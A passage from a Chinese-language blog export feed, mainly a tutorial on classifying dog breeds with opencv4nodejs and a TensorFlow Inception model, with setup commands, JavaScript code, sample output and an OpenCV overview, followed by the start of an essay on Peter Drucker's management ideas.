<h2 id="扩展阅读-《The-Machine-Learning-Master》"><a href="#扩展阅读-《The-Machine-Learning-Master》" class="headerlink" title="扩展阅读:《The Machine Learning Master》"></a>扩展阅读:<a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h2><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
<li><a href="https://riboseyim.github.io/2018/10/03/Machine-Learning-Uber/">Uber 业务预测系统实践</a></li>
</ul>
<h2 id="How"><a href="#How" class="headerlink" title="How"></a>How</h2><ul>
<li><a href="http://www.infoq.com/cn/news/2015/12/the-20-key-tips-in-ml-to-know/">构建机器学习系统的20个经验教训</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://mp.weixin.qq.com/s/-wSYLu-XvOrsST8_KEUa-Q">浅谈人工智能：现状、任务、构架与统一 | 正本清源 | 原创 2017-11-02 朱松纯  视觉求索</a></li>
<li><a href="https://www.ft.com/content/99165d7a-1646-11e8-9376-4a6390addb44">Alibaba’s social credit rating is a risky game | FT.com</a></li>
<li><a href="https://medium.com/@akiranin/how-machine-learning-is-changing-software-development-301928bb7772">How Machine Learning is changing Software Development | Aki Ranin </a></li>
<li><a href="https://tech.meituan.com/herenqing_ai_con.html">美团外卖骑手背后的AI技术 | 何仁清 ·2018-03-29 19:40</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>DevOps</tag>
        <tag>架构师</tag>
        <tag>Developer</tag>
        <tag>数学与算法</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</title>
    <url>/2018/01/15/Machine-Learning-OpenCV/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>计算机视觉库：OpenCV</li>
<li>Using OpenCV with Node.js</li>
</ul>
<span id="more"></span>
<h2 id="Privious"><a href="#Privious" class="headerlink" title="Privious"></a>Privious</h2><p>OpenCV ( Open Source Computer Vision Library )，是一个基于C/C++语言的计算机视觉库，在跨平台图像/视频处理、模式识别、人机交互、机器人等领域有广泛的应用。</p>
<p>OpenCV 包含机器学习库，支持传统的机器学习算法（决策树、朴素贝叶斯、支持向量机、随机森林等），近期的版本演进侧重于增强深度学习的支持，例如 <a href="https://opencv.org/opencv-3-3.html">OpenCV 3.3</a> 将深度神经网络（Deep neural networks，DNN ) 提升到主代码库（promote DNN module from opencv_contrib to the main repository），2017 年 12 月发布的 OpenCV 3.4 针对 R-CNN 进行了性能优化。</p>
<p>OpenCV 的主要编程是 C++ ，大部分的接口也是基于 C++，但它仍然保留着很多 C 接口（功能不完整）。绑定语言（binding）有 Python，java 和 MATLAB /OCTAVE ，另外还有一些其他语言的包装器（wrapper）如 C# , Perl , Haskell 和 Ruby。<strong><a href="https://github.com/justadudewhohacks/opencv4nodejs">opencv4nodejs</a></strong> 项目是一个支持所有 OpenCV 3 的 Node.js 绑定，有助于弥补 JavaScript 缺乏计算机视觉实现的不足，为 Node.js 优势应用场景的选型中提供了更多选择（例如使用 WebSocket 推送技术创建实时 Web 应用）。</p>
<p>前文回顾：<a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a> 中演示了一个图像识别的案例，我们来看看基于 OpenCV + Node.js 是如何实现的：</p>
<h2 id="Using-OpenCV-with-Node-js"><a href="#Using-OpenCV-with-Node-js" class="headerlink" title="Using OpenCV with Node.js"></a>Using OpenCV with Node.js</h2><p><img src="http://riboseyim-qiniu.riboseyim.com/ML-Tensorflow-Theme-Dog.png" alt=""></p>
<h4 id="Enviroment"><a href="#Enviroment" class="headerlink" title="Enviroment"></a>Enviroment</h4><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ cmake --version</span><br><span class="line">cmake version 3.10.2</span><br><span class="line"></span><br><span class="line">$ brew install cmake</span><br><span class="line"></span><br><span class="line">$ brew install opencv3</span><br><span class="line"><span class="comment"># dependencies for opencv: eigen, lame, x264, xvid, ffmpeg, libpng,</span></span><br><span class="line"><span class="comment"># libtiff, ilmbase, openexr, gdbm, python, xz, python3, numpy, tbb</span></span><br><span class="line"></span><br><span class="line">$ mkdir project-opencv-demo</span><br><span class="line">$ <span class="built_in">cd</span> project-opencv-demo</span><br><span class="line">$ npm init</span><br><span class="line">$ npm install --save opencv4nodejs</span><br></pre></td></tr></table></figure>
<h4 id="Load-InceptionModel"><a href="#Load-InceptionModel" class="headerlink" title="Load InceptionModel"></a>Load InceptionModel</h4><p>Tensorflow Inception Model 是一个已经被训练好的模型，可以识别数千类对象，只要将图像输入就可以输出推测的一个分类概率。Tensorflow Inception Model 包括 ‘graph.pb’ 和 ‘label_strings.txt’ 两个文件，使用之前需要先加载。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> cv = <span class="built_in">require</span>(<span class="string">&#x27;opencv4nodejs&#x27;</span>);</span><br><span class="line"><span class="comment">//const cv = require(&#x27;../&#x27;);</span></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!cv.xmodules.dnn) &#123;</span><br><span class="line">  <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&#x27;exiting: opencv4nodejs compiled without dnn module&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// replace with path where you unzipped inception model</span></span><br><span class="line"><span class="keyword">const</span> inceptionModelPath = <span class="string">&#x27;./models/tf-inception&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> modelFile = path.resolve(inceptionModelPath, <span class="string">&#x27;tensorflow_inception_graph.pb&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> classNamesFile = path.resolve(inceptionModelPath, <span class="string">&#x27;imagenet_comp_graph_label_strings.txt&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!fs.existsSync(modelFile) || !fs.existsSync(classNamesFile)) &#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;exiting: could not find inception model&#x27;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;download the model from: https://storage.googleapis.com/download.tensorflow.org/models/inception5h.zip&#x27;</span>);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&#x27;load models:&#x27;</span>+inceptionModelPath)</span><br><span class="line"></span><br><span class="line"><span class="comment">// read classNames and store them in an array</span></span><br><span class="line"><span class="keyword">const</span> classNames = fs.readFileSync(classNamesFile).toString().split(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// initialize tensorflow inception model from modelFile</span></span><br><span class="line"><span class="keyword">const</span> net = cv.readNetFromTensorflow(modelFile);</span><br></pre></td></tr></table></figure>
<h4 id="Image-Classify"><a href="#Image-Classify" class="headerlink" title="Image Classify"></a>Image Classify</h4><p>读取图片存储为 Blob 格式，调用 <strong>net.forward()</strong> （图像作为输入参数），此处我们仅输出概率高于 5% 的分类。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> classifyImg = <span class="function">(<span class="params">img</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="comment">// inception model works with 224 x 224 images, so we resize</span></span><br><span class="line">  <span class="comment">// our input images and pad the image with white pixels to</span></span><br><span class="line">  <span class="comment">// make the images have the same width and height</span></span><br><span class="line">  <span class="keyword">const</span> maxImgDim = <span class="number">224</span>;</span><br><span class="line">  <span class="keyword">const</span> white = <span class="keyword">new</span> cv.Vec(<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>);</span><br><span class="line">  <span class="keyword">const</span> imgResized = img.resizeToMax(maxImgDim).padToSquare(white);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// network accepts blobs as input</span></span><br><span class="line">  <span class="keyword">const</span> inputBlob = cv.blobFromImage(imgResized);</span><br><span class="line">  net.setInput(inputBlob);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// forward pass input through entire network, will return</span></span><br><span class="line">  <span class="comment">// classification result as 1xN Mat with confidences of each class</span></span><br><span class="line">  <span class="keyword">const</span> outputBlob = net.forward();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// find all labels with a minimum confidence</span></span><br><span class="line">  <span class="keyword">const</span> minConfidence = <span class="number">0.05</span>;</span><br><span class="line">  <span class="keyword">const</span> locations =</span><br><span class="line">    outputBlob</span><br><span class="line">      .threshold(minConfidence, <span class="number">1</span>, cv.THRESH_BINARY)</span><br><span class="line">      .convertTo(cv.CV_8U)</span><br><span class="line">      .findNonZero();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> result =</span><br><span class="line">    locations.map(<span class="function"><span class="params">pt</span> =&gt;</span> (&#123;</span><br><span class="line">      <span class="attr">confidence</span>: <span class="built_in">parseInt</span>(outputBlob.at(<span class="number">0</span>, pt.x) * <span class="number">100</span>) / <span class="number">100</span>,</span><br><span class="line">      <span class="attr">className</span>: classNames[pt.x]</span><br><span class="line">    &#125;))</span><br><span class="line">      <span class="comment">// sort result by confidence</span></span><br><span class="line">      .sort(<span class="function">(<span class="params">r0, r1</span>) =&gt;</span> r1.confidence - r0.confidence)</span><br><span class="line">      .map(<span class="function"><span class="params">res</span> =&gt;</span> <span class="string">`<span class="subst">$&#123;res.className&#125;</span> (<span class="subst">$&#123;res.confidence&#125;</span>)`</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Test"><a href="#Test" class="headerlink" title="Test"></a>Test</h4><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> testData = [</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">image</span>: <span class="string">&#x27;./data/IMG_3560.png&#x27;</span>,</span><br><span class="line">    <span class="attr">label</span>: <span class="string">&#x27;Yan Dog&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="attr">image</span>: <span class="string">&#x27;./data/IMG_3608.png&#x27;</span>,</span><br><span class="line">    <span class="attr">label</span>: <span class="string">&#x27;Yang Dog&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">];</span><br><span class="line"></span><br><span class="line">testData.forEach(<span class="function">(<span class="params">data</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> img = cv.imread(data.image);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;%s,%s: &#x27;</span>, data.image,data.label);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> predictions = classifyImg(img);</span><br><span class="line">  predictions.forEach(<span class="function"><span class="params">p</span> =&gt;</span> <span class="built_in">console</span>.log(p));</span><br><span class="line"></span><br><span class="line">  <span class="comment">//cv.imshowWait(&#x27;img&#x27;, img);</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;---------finish---------&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p><img src="http://riboseyim-qiniu.riboseyim.com/Tensorflow-Demo-Dog-2.png" alt="IMG_3608.png"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$ npm run tf-classify</span><br><span class="line"></span><br><span class="line">&gt; node ./tf-classify.js</span><br><span class="line">load models:./models/tf-inception</span><br><span class="line"></span><br><span class="line">-------------------------------</span><br><span class="line">./data/IMG_3560.png,Yan Dog:</span><br><span class="line">[ INFO:0] Initialize OpenCL runtime...</span><br><span class="line">潘布魯克威尔斯柯基犬 Pembroke (0.83)</span><br><span class="line">-------------------------------</span><br><span class="line">./data/IMG_4423.png,Yang Dog:</span><br><span class="line">吉娃娃 Chihuahua (0.89)</span><br><span class="line">Pembroke (0.07)</span><br><span class="line">-------------------------------</span><br><span class="line">./data/IMG_3608.png,Yang Dog:</span><br><span class="line">玩具梗 toy terrier (0.22)</span><br><span class="line">美国斯塔福德郡梗 American Staffordshire terrier (0.2)</span><br><span class="line">吉娃娃 Chihuahua (0.14)</span><br><span class="line">斯塔福德郡牛头梗 Staffordshire bullterrier (0.12)</span><br><span class="line">比特犬 whippet (0.05)</span><br><span class="line">-------------------------------</span><br></pre></td></tr></table></figure>
<p>问题：对比之前 <a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a> 的预测值，两次识别的结果很接近，但是又有不同，这是为什么呢？请注意后续更新。</p>
<h2 id="OpenCV-概要"><a href="#OpenCV-概要" class="headerlink" title="OpenCV 概要"></a>OpenCV 概要</h2><p>OpenCV ( Open Source Computer Vision Library )，是一个基于C/C++语言的跨平台图像/视频处理函数库。OpenCV 由英特尔公司于1999年发起并参与开发，以 BSD 许可证授权发行，可以在商业和研究领域中免费使用。OpenCV 主要用于开发实时的图像处理、计算机视觉以及模式识别程序。</p>
<p>OpenCV 的主要编程是 C++ ，大部分的接口也是基于 C++，但它仍然保留着很多 C 接口（不完整）。绑定语言（binding）有 Python，java 和 MATLAB /OCTAVE ，另外还有一些其他语言的包装器（wrapper）如 C# , Perl , Haskell 和 Ruby。</p>
<h4 id="OpenCV-版本"><a href="#OpenCV-版本" class="headerlink" title="OpenCV 版本"></a>OpenCV 版本</h4><p>OpenCV 第一个预览版本于 2000 年在 IEEE Conference 公开，目前每6个月就会有一个官方版本，由一个商业公司赞助的独立小组开发。<br>OpenCV 1.0：2006年发布<br>OpenCV 2.0：2009年10月发布，主要更新包括 C++ 接口<br>OpenCV 2.3：2011年6月发布，主要更新包括移动终端兼容性（NDK-Build）<br>OpenCV 3.0：2015年6月发布<br>OpenCV 3.3: 2017年8月发布，主要更新包括深度学习（promote DNN module from opencv_contrib to the main repository）<br>OpenCV 3.4: 2017年12月发布，主要更新包括 DNN 模块改进（包括 R-CNN 性能优化), Javascript 绑定和 OpenCL 实现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看版本</span></span><br><span class="line">$ pkg-config --modversion opencv</span><br><span class="line">3.4.0</span><br></pre></td></tr></table></figure>
<h4 id="OpenCV-主要模块"><a href="#OpenCV-主要模块" class="headerlink" title="OpenCV 主要模块"></a>OpenCV 主要模块</h4><ul>
<li>cv 核心函数库</li>
<li>cvaux 辅助函数库</li>
<li>cxcore 数据结构与线性代数库</li>
<li>highgui GUI 函数库，包括用户界面、读/写图像及视频</li>
<li>ml 机器学习函数库，包括统计模型、贝叶斯、最近邻居、支持向量机、决策树、随机树、最大期望、神经网络等，详见<a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a>。</li>
<li>gpu GPU加速,GPU模块及数据结构，包含图像处理与分析模块</li>
</ul>
<h4 id="OpenCV-主要功能"><a href="#OpenCV-主要功能" class="headerlink" title="OpenCV 主要功能"></a>OpenCV 主要功能</h4><ul>
<li>图像数据操作（内存分配与释放 allocation &amp; release，图像复制 copying、设定和转换 setting &amp; conversion）</li>
<li>矩阵/向量数据操作及线性代数运算（矩阵乘积、矩阵方程求解、特征值、奇异值分解）</li>
<li>支持多种动态数据结构（链表、队列、数据集、树、图）</li>
<li>基本图像处理（去噪、边缘检测、角点检测、采样与插值、色彩变换、形态学处理、直方图、图像金字塔结构）</li>
<li>结构分析（连通域/分支、轮廓处理、距离转换、图像矩、模板匹配、霍夫变换、多项式逼近、曲线拟合、椭圆拟合、狄劳尼三角化）</li>
<li>图像/视频的输入输出（支持文件或摄像头的输入，图像/视频文件的输出）</li>
<li>摄像头定标（寻找和跟踪定标模式、参数定标、基本矩阵估计、单应矩阵估计、立体视觉匹配）</li>
<li>运动分析（光流 optical flow、动作分割 motion segmentation、目标跟踪 tracking）</li>
</ul>
<h4 id="OpenCV-基本数据类型"><a href="#OpenCV-基本数据类型" class="headerlink" title="OpenCV 基本数据类型"></a>OpenCV 基本数据类型</h4><ul>
<li>CvPoint:表示一个坐标为整数的二维点</li>
<li>CvSize:表示矩阵框大小，以像素为精度。</li>
<li>CvRect:通过方形左上角坐标和方形的高和宽来确定一个矩形区域</li>
<li>CvScalar:用来存放像素值（ double 数组，不一定是灰度值）</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span>  <span class="class"><span class="keyword">struct</span>  <span class="title">CvPoint</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> x;<span class="comment">//图像中点的x坐标</span></span><br><span class="line">    <span class="keyword">int</span> y;<span class="comment">//图像中点的y坐标</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CvSize</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> width; <span class="comment">//矩形宽</span></span><br><span class="line">    <span class="keyword">int</span> height; <span class="comment">//矩形高</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CvRect</span> 　　</span></span><br><span class="line"><span class="class">&#123;</span> 　　</span><br><span class="line">    <span class="keyword">int</span> x; <span class="comment">//方形的左上角的x-坐标 　　</span></span><br><span class="line">    <span class="keyword">int</span> y; <span class="comment">//方形的左上角的y-坐标　</span></span><br><span class="line">    <span class="keyword">int</span> width; <span class="comment">//宽 　　</span></span><br><span class="line">    <span class="keyword">int</span> height; <span class="comment">//高</span></span><br><span class="line">&#125; 　</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">CvScalar</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">double</span> val[<span class="number">4</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="OpenCV-与机器学习"><a href="#OpenCV-与机器学习" class="headerlink" title="OpenCV 与机器学习"></a>OpenCV 与机器学习</h4><p>OpenCV 包含机器学习库，支持以下算法：</p>
<ul>
<li>Boosting</li>
<li>Decision tree learning</li>
<li>Gradient boosting trees</li>
<li>Expectation-maximization algorithm</li>
<li>k-nearest neighbor algorithm</li>
<li>Naive Bayes classifier</li>
<li>Artificial neural networks</li>
<li>Random forest</li>
<li>Support vector machine (SVM)</li>
<li>Deep neural networks (DNN) （<a href="https://opencv.org/opencv-3-3.html">OpenCV 3.3</a> promote DNN module from opencv_contrib to the main repository）</li>
</ul>
<p><img src="http://riboseyim-qiniu.riboseyim.com/ML-Algorithm-OpenCV.png" alt=""></p>
<h4 id="OpenCV-资源"><a href="#OpenCV-资源" class="headerlink" title="OpenCV 资源"></a>OpenCV 资源</h4><ul>
<li><a href="https://github.com/opencv/opencv">OpenCV github repo</a></li>
<li><a href="https://hub.docker.com/r/justadudewhohacks/opencv-nodejs/">Using OpenCV with Node.js</a></li>
<li><a href="https://github.com/justadudewhohacks/opencv4nodejs">opencv4nodejs</a></li>
<li><a href="http://wiki.opencv.org.cn/index.php/OpenCV_%E7%BC%96%E7%A8%8B%E7%AE%80%E4%BB%8B%EF%BC%88%E7%9F%A9%E9%98%B5/%E5%9B%BE%E5%83%8F/%E8%A7%86%E9%A2%91%E7%9A%84%E5%9F%BA%E6%9C%AC%E8%AF%BB%E5%86%99%E6%93%8D%E4%BD%9C%EF%BC%89#.EF.BC.884.EF.BC.89____.E8.AE.BE.E7.BD.AE.2F.E8.8E.B7.E5.8F.96.E6.84.9F.E5.85.B4.E8.B6.A3.E5.8C.BA.E5.9F.9FROI:">OpenCV编程简介 Introduction to programming with OpenCV</a></li>
</ul>
<h2 id="扩展阅读"><a href="#扩展阅读" class="headerlink" title="扩展阅读"></a>扩展阅读</h2><h4 id="《The-Machine-Learning-Master》"><a href="#《The-Machine-Learning-Master》" class="headerlink" title="《The Machine Learning Master》"></a><a href="https://www.gitbook.com/book/riboseyim/machine-learning">《The Machine Learning Master》</a></h4><p><img src="http://riboseyim-qiniu.riboseyim.com/banner-MLM-201803.png" alt=""></p>
<ul>
<li><a href="https://riboseyim.github.io/2018/01/17/Machine-Learning-TensorFlow/">Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别</a></li>
<li><a href="https://riboseyim.github.io/2018/01/15/Machine-Learning-OpenCV/">Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js</a></li>
<li><a href="https://riboseyim.github.io/2018/02/09/Machine-Learning-Projects/">Machine Learning:机器学习项目</a></li>
<li><a href="https://riboseyim.github.io/2018/02/10/Machine-Learning-Algorithms/">Machine Learning:机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/04/02/Machine-Learning-Algorithms-Sheet/">Machine Learning:如何选择机器学习算法</a></li>
<li><a href="https://riboseyim.github.io/2018/05/07/Machine-Learning-Neural-Network">Machine Learning:神经网络基础</a></li>
<li><a href="https://riboseyim.github.io/2018/01/25/Machine-Learning-Books/">Machine Learning:机器学习书单</a></li>
<li><a href="https://riboseyim.github.io/2017/08/29/Machine-Learning-News">Machine Learning:人工智能媒体报道集</a></li>
<li><a href="https://riboseyim.github.io/2018/02/16/Machine-Learning-Law/">Machine Learning:机器学习技术与知识产权法</a></li>
<li><a href="https://riboseyim.github.io/2018/03/09/Machine-Learning-Economist/">Machine Learning:经济学家谈人工智能</a></li>
<li><a href="https://riboseyim.github.io/2017/09/15/Visualization-Graphviz/">数据可视化（三）基于 Graphviz 实现程序化绘图</a></li>
</ul>
<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul>
<li><a href="https://heartbeat.fritz.ai/the-5-computer-vision-techniques-that-will-change-how-you-see-the-world-1ee19334354b">The 5 Computer Vision Techniques That Will Change How You See The World</a></li>
<li><strong>Paper</strong> <a href="https://arxiv.org/pdf/1512.00567.pdf">Rethinking the Inception Architecture for Computer Vision</a></li>
<li><a href="https://medium.com/@muehler.v/node-js-meets-opencvs-deep-neural-networks-fun-with-tensorflow-and-caffe-ff8d52a0f072">Node.js meets OpenCV’s Deep Neural Networks — Fun with Tensorflow and Caffe</a></li>
<li><a href="https://outcrawl.com/image-recognition-api-go-tensorflow/">Build an Image Recognition API with Go and TensorFlow</a></li>
<li><a href="https://research.googleblog.com/2016/03/train-your-own-image-classifier-with.html">Train your own image classifier with Inception in TensorFlow | Wednesday, March 09, 2016 | Google Research Blog</a></li>
<li><a href="https://medium.com/@muehler.v/node-js-opencv-for-face-recognition-37fa7cb860e8">Node.js + OpenCV for Face Recognition</a></li>
<li><a href="https://medium.com/@muehler.v/node-js-face-recognition-js-simple-and-robust-face-recognition-using-deep-learning-ea5ba8e852">Node.js + face-recognition.js : Simple and Robust Face Recognition using Deep Learning</a></li>
<li><a href="https://medium.com/@muehler.v/node-js-meets-opencvs-deep-neural-networks-fun-with-tensorflow-and-caffe-ff8d52a0f072">Node.js meets OpenCV’s Deep Neural Networks — Fun with Tensorflow and Caffe</a></li>
<li><a href="https://medium.com/@ageitgey/machine-learning-is-fun-part-4-modern-face-recognition-with-deep-learning-c3cffc121d78">Machine Learning is Fun! Part 4: Modern Face Recognition with Deep Learning</a></li>
<li><a href="https://medium.com/@muehler.v/machine-learning-with-opencv-and-javascript-part-1-recognizing-handwritten-letters-using-hog-and-88719b70efaa">Machine Learning with OpenCV and JavaScript: Recognizing Handwritten Letters using HOG and SVM</a></li>
<li><a href="https://www.youtube.com/watch?v=rbZeZNVA-Q4">Live Face Detection in Go using OpenCV and MachineBox | video</a></li>
<li><a href="http://www.infoq.com/cn/news/2016/10/YAHOO-pornographic-detection-ne?utm_campaign=infoq_content&amp;utm_source=infoq&amp;utm_medium=feed&amp;utm_term=global">雅虎开源色情图片检测神经网络</a></li>
</ul>
]]></content>
      <categories>
        <category>工程技术</category>
      </categories>
      <tags>
        <tag>Developer</tag>
        <tag>Nodejs</tag>
        <tag>Machine-Learning</tag>
      </tags>
  </entry>
  <entry>
    <title>The Road To Leader:管理哲学</title>
    <url>/2017/07/02/Manager/</url>
    <content><![CDATA[<h2 id="摘要"><a href="#摘要" class="headerlink" title="摘要"></a>摘要</h2><ul>
<li>彼得·德鲁克论管理哲学</li>
</ul>
<span id="more"></span>
<h2 id="彼得·德鲁克论管理哲学"><a href="#彼得·德鲁克论管理哲学" class="headerlink" title="彼得·德鲁克论管理哲学"></a>彼得·德鲁克论管理哲学</h2><h4 id="知识必须要不断地改进、质疑和增加，否则它就会消失"><a href="#知识必须要不断地改进、质疑和增加，否则它就会消失" class="headerlink" title="知识必须要不断地改进、质疑和增加，否则它就会消失"></a>知识必须要不断地改进、质疑和增加，否则它就会消失</h4><blockquote>
<p>每隔3～4年，我都会挑选一个新的学科。可能是日本艺术，也可能是经济学。3年的学习并不足以掌握一个学科的专业知识，但至少能够对它有一个基本的了解。因此，在六十多年的时间里，我一直在坚持不断地系统学习，从一个学科到另一个学科。这不仅让我获得了丰厚的知识储备，也迫使我以开放的眼界面对新的科目、新的路径和新的方法，因为每一个学科都有着不同的假设和不同的方法论。</p>
</blockquote>
<p>机构是由一群专业人士组成的。举个例子，某个乐队成员至少都应该了解音乐，要知道作曲家的作品是什么样的，而不仅仅是只知道一个巴松管。你必须要有整体责任意识，要将自己置于一个更大画面中。命令是自上而下的，信息则是自下而上的。（不列颠百科全书奖的获奖致辞，1987）</p>
<h4 id="应用到工作中的知识才是知识工作"><a href="#应用到工作中的知识才是知识工作" class="headerlink" title="应用到工作中的知识才是知识工作"></a>应用到工作中的知识才是知识工作</h4><p>学界普遍认为知识就是你在学校课堂里学到的东西，但事实并非如此。我们在课堂上获得的是信息，我们希望你具有学习的能力。我们在书本中学到的是学问，而只有你将这种学问应用到工作中时，它才会转变为知识。</p>
<p>如果你的行动会导致外部发生变化，而你自身却未发生任何变化，那么这表明你并没有真正地学到什么。而如果只有你自身发生了变化，那么这表明你并没有真正地运用知识。因此，问题就在于：我们该如何对待那些学有所成的、掌握信息的人？我们又该如何让他们变得高效呢？首先要指出的是，提高计时工人工作效率的方式并不适用于他们。首要一点，如果他们是优秀的人才，那么他们对自己所从事工作的了解程度将远超过老板。其次，教育给予了人们自信心，使之具备了流动能力，从而为个人发展提供了更大的舞台。</p>
<p>我至今仍听到商界的一些朋友谈论忠诚度之类的话题。不要再谈了。接受这样一个现实，那就是你必须要为雇员提供有价值的工作。获取薪水是工作的目的之一，但却非唯一目的。</p>
<h4 id="信息化组织必须是一个开创型组织"><a href="#信息化组织必须是一个开创型组织" class="headerlink" title="信息化组织必须是一个开创型组织"></a>信息化组织必须是一个开创型组织</h4><p>你该如何去组织呢？事实上，你必须要有一个学科作为基础，同时，你还要了解其他与之相关的外部学科。一个学科是必须的容器，但它只是暂时性的，非常短暂。那么，你该如何去做呢？现在，很多公司已经发现，你 <strong>需要的并不是一个精于某一领域的研究负责人，你需要的是一个了解其他诸多领域的技术专家</strong>。</p>
<p>你必须要从知识本身是不断变化的这一假定触发————你掌握的知识越多，它的变化就越多。有假定认为，知识本身是一种输入，它必须经过整合才能成为输出。有假定认为知识必须是集中的。如果你将它愤慨，那么你只会得到很少。你得到的是新闻，而不是知识。</p>
<h4 id="变革对你我的意义"><a href="#变革对你我的意义" class="headerlink" title="变革对你我的意义"></a>变革对你我的意义</h4><p>未来的管理人员一定要打好见识的基础。坦白地讲，我觉得我们现在做得还不够。在我们的高管培训计划中，我发现很多人在基础知识方面都很薄弱。原因有二：一是以为你太过于专业化了。在我们这个国家，大多数人走的是技术路线，也就是说，他们的升迁是靠自己的专业，除非他们做到公司的高层，否则他们不会参与公司的其他业务或管理。就个人而言，这或许是一种优势，但最终他是要付出代价的。</p>
